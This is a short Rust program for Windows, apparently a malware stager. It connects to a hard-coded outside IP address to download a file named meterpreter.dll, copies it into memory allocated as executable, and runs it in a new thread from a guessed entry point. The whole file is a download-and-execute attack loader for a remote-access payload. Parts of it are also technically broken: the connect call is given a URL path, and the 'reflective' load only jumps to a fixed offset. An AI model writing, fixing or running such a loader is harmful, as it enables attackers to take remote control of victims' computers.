use std::net::TcpStream;
use std::io::Read;
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use winapi::um::winnt::DLL_PROCESS_ATTACH;

fn main() {
    // 1. Download DLL
    let mut stream = TcpStream::connect("157.245.3.180:8000/meterpreter.dll").unwrap();
    let mut dll_data = Vec::new();
    stream.read_to_end(&mut dll_data).unwrap();

    // 2. Allocate memory
    let exec_mem = unsafe {
        winapi::um::memoryapi::VirtualAlloc(
            std::ptr::null_mut(),
            dll_data.len(),
            winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
        )
    };

    // 3. Copy DLL
    unsafe {
        std::ptr::copy(dll_data.as_ptr(), exec_mem as *mut u8, dll_data.len());
    }

    // 4. Load DLL (Reflective)
    let dll_main = exec_mem as usize + 0x1000; // Approximate entry
    let thread = unsafe {
        winapi::um::processthreadsapi::CreateThread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(dll_main)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        )
    };

    unsafe { winapi::um::synchapi::WaitForSingleObject(thread, winapi::um::winbase::INFINITE); }
}
